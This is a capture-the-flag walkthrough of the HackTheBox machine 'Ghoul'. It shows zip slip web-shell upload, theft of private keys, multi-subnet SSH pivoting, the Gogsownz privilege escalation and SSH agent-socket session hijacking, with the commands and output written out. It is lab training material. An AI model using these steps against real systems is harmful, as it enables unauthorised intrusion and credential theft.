---
title: "HackTheBox WriteUp — Ghoul"
date: 2023-05-15
lane: "offense"
description: "A walkthrough of one of HackTheBox's hardest machines — Ghoul. Zip slip exploitation, multi-host pivoting across Docker containers, Gogs privilege escalation, git history mining, and SSH session hijacking to reach root."
tags: ["hackthebox", "linux", "pivoting", "docker", "privilege-escalation", "gogs"]
featured: false
draft: false
canonical_url: "https://medium.com/bugbountywriteup/hackthebox-writeup-ghoul-ca5913f3"
---

## Summary

This box is extremely difficult. When starting out, I thought it was fun, but I will tell you now that this is not for the faint of heart. I anticipate this will be the longest writeup / walkthrough I've written so far…

### I'm too busy to read everything… just give me the highlights…

1. First, log in to the web service on port 8080 with default credentials (admin/admin)
2. Upload a malicious zip file using zip slip to write a php shell in webroot
3. Use the php shell to download private keys
4. SSH as user kaneki
5. Pivot to access other subnets and machines
6. Upload statically compiled binaries to assist with enumeration
7. Use Gogsownz exploit
8. Search the git commit history for a password to an archive file
9. Hijack the root session

### I want all the tea, give me the details!!!

Ok bud, you asked for it!

## Scans Away

As always, we start out with basic scanning so we can see what's running on the host.

```
Nmap scan report for 10.10.10.101
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

Interesting… ssh is running on both port 22 and port 2222? Let's flag that for later.

## Port 8080 — Web Enumeration

This web service is protected by basic auth. The protection is not so great as you can get in with admin:admin credentials.

## Evil Zipper

This page is confusing as it has multiple divs, but keep watching the rotating upload div and you'll see an option to upload a .zip file. It appears that the code will take the zip file and extract it to an unknown location.

Because this is blind, we need to create several zip files with different depths until we find one that will allow us to extract a payload into the `/var/www/html` path. I decided to go with p0wny.php shell, but any simple php shell would do the trick.

To do this, I used a project called EvilArc:

```bash
python exploit.py p0wny.php --os unix --path var/www/html/ --depth 3 --output evil3.zip
python exploit.py p0wny.php --os unix --path var/www/html/ --depth 4 --output evil4.zip
python exploit.py p0wny.php --os unix --path var/www/html/ --depth 5 --output evil5.zip
```

The appropriate depth in this case is 3. When this is uploaded, p0wny.php is extracted and placed into the html folder. We now have our foothold!

## Web Shell

You can use p0wnyshell or several other php based shells to start browsing around the filesystem. Get used to it as you'll be doing a lot of this!

Looking in the `/etc/passwd` and `/home` directories you'll find 3 users: eto, kaneki, and noro.

Eventually you will find an interesting folder here: `/var/backups/backups/`

```
kaneki@Aogiri:/var/backups/backups$ ls
Important.pdf  keys  note.txt  sales.xlsx
kaneki@Aogiri:/var/backups/backups$ cat note.txt
The files from our remote server Ethereal will be saved here. I'll keep updating it overtime, so keep checking.
kaneki@Aogiri:/var/backups/backups$ ls keys
eto.backup  kaneki.backup  noro.backup
```

Well looky here! And now we have 3 private keys :)

Let's copy these to your local box. Don't forget to `chmod 600` each of them before use.

Noro's key gets us in but there's nothing useful. Logging in as kaneki requires a passphrase! Hopefully you downloaded or had a look at `secret.php` while you were browsing `/var/www/html` because you will need it.

Kaneki's password is: `ILoveTouka` (You should commit this to memory as you'll be typing it a lot!!)

```bash
ssh kaneki@10.10.10.101 -i kaneki.key
kaneki@Aogiri:~$ cat user.txt
<user key>
```

## The Epic Journey to Root!

Easy peasy so far, right? Well let's get ready to enter through the looking glass to find root.txt.

### More Enumeration

```bash
kaneki@Aogiri:~$ cat note.txt
Vulnerability in Gogs was detected. I shutdown the registration function on our server,
please ensure that no one gets access to the test accounts.
```

Here we glean some valuable information. Apparently there are other servers and one of them could be Gogs. Let's tuck this away and start looking for other servers.

```bash
kaneki@Aogiri:~$ ifconfig
eth0: inet 172.20.0.10  netmask 255.255.0.0
```

Now we know there's a subnet called 172.20.0.0/24. I uploaded a statically compiled nmap:

```bash
kaneki@Aogiri:/tmp$ ./nmap -sP 172.20.0.0/24
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00027s latency).
Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.000031s latency).
Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00025s latency).
```

We've discovered a new host: 64978af526b2.Aogiri (172.20.0.150) running port 22 only!

From kaneki's `.ssh/authorized_keys` we find the key belongs to `kaneki_pub@kaneki-pc`. Let's connect:

```bash
kaneki@Aogiri:~$ ssh kaneki_pub@172.20.0.150
kaneki_pub@kaneki-pc:~$ cat to-do.txt
Give AogiriTest user access to Eto for git.
```

### Another host, another subnet — 172.18.0.0/24

Running ifconfig, we see that kaneki-pc has two IPs on two subnets:

```
eth0: inet 172.20.0.150  netmask 255.255.0.0
eth1: inet 172.18.0.200  netmask 255.255.0.0
```

Scanning the second subnet reveals:

```bash
kaneki_pub@kaneki-pc:/tmp$ ./nmap -sP 172.18.0.0/24
Nmap scan report for Aogiri (172.18.0.1)
Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Nmap scan report for kaneki-pc (172.18.0.200)
```

And port scanning 172.18.0.2 reveals port 3000 — likely our Gogs server.

### Information Review

So let's take a minute and figure out what we've learned!

There are 3 hosts on the 172.18.0.0/24 CIDR:
- Aogiri is same as 10.10.10.101 (172.18.0.1)
- cuff_web_1.cuff_default (172.18.0.2)
- kaneki-pc (172.18.0.200 and 172.20.0.150)

## Pivoting!!

Time to do some port forwarding so we can access port 3000 on 172.18.0.2 from our Kali box:

```bash
# Terminal 1 - Forward through 10.10.10.101
ssh -L 127.0.0.1:3000:172.20.0.150:3000 kaneki@10.10.10.101 -i kaneki.key

# Terminal 2 - Forward through kaneki-pc
ssh -L 172.20.0.150:3000:172.18.0.2:3000 kaneki_pub@172.18.0.200
```

Now open a browser to `http://127.0.0.1:3000` — Found our Gogs Server!!!!

## Welcome to Gogs!

Now that we have a Gogs UI, we have to figure out how to get in. We need to find the tomcat credentials on the original box:

```bash
kaneki@Aogiri:/usr/share/tomcat7$ grep -r "aogiri"
conf/tomcat-users.xml:  <!--<user username="admin" password="test@aogiri123" roles="admin" />
```

Let's log in with `AogiriTest:test@aogiri123`

### Gogsownz

After much experimentation, found that you can privesc to an admin user (kaneki) using the Gogsownz exploit:

```bash
python3 gogsownz.py -k -n i_like_gogits -C AogiriTest:test@aogiri123 \
  -c fa348246aeb2b560 http://127.0.0.1:3000 -v
[+] Logged in sucessfully as AogiriTest
[i] Signed in as kaneki, is admin True
[i] Current session cookie: '2e16001337'
```

Then use the admin session to write our SSH key into the gogs user's authorized_keys.

**BE PATIENT, THIS WILL WORK BUT YOU MIGHT HAVE TO TRY A FEW TIMES**

## 172.18.0.2 — Gogs Server Enumeration

Root.txt is not here either… son of a gun! But we discover a strange process called `gosu`:

```bash
3713ea5e4353:~$ gosu root:root bash -c 'ls -la /root'
-rw-r--r--    1 root     root        117507 Dec 29 06:40 aogiri-app.7z
-rwxr-xr-x    1 root     root           179 Dec 16 07:10 session.sh
```

Get that `aogiri-app.7z` file back to Kali via a bunch of scp commands.

## C'mon Git Happy!

1. Extract the .7z file
2. Browse to the folder
3. Use `git reflog` to get a full history of the repo
4. Use `git diff` to compare each branch to the other

Eventually you'll find a password in the `application.properties` file: `7^Grc%C\7xEQ?tb4`

Where to use it? Password all the things!!!!

Turns out kaneki-pc is a great spot:

```bash
kaneki_pub@kaneki-pc:~$ su root
Password:
root@kaneki-pc:/home/kaneki_pub#
```

## Session Hijacking

If you upload pspy64 to the box and run it, you'll see that `kaneki_adm` logs in every 6 minutes. You must react quickly to catch the session and hijack it!

1. Upload pspy64 to kaneki-pc
2. Get two root connections on 172.18.0.200
3. As soon as you see `kaneki_adm` log in via pspy64, find the agent socket:

```bash
root@kaneki-pc:/home/kaneki_adm# find /tmp -name "*agent*" 2>/dev/null
/tmp/ssh-v2z2opBufh/agent.1675
```

4. Hijack the session:

```bash
root@kaneki-pc:# SSH_AUTH_SOCK=/tmp/ssh-v2z2opBufh/agent.1675 ssh root@172.18.0.1 -p 2222
```

If this works:

```bash
root@Aogiri:/# cat /root/root.txt
<root key>
```

And you're done!!! Happy hacking!

---

*Originally published on [InfoSec Write-ups](https://medium.com/bugbountywriteup/hackthebox-writeup-ghoul-ca5913f3)*

`bksp_ // enumerate. prove. document.`
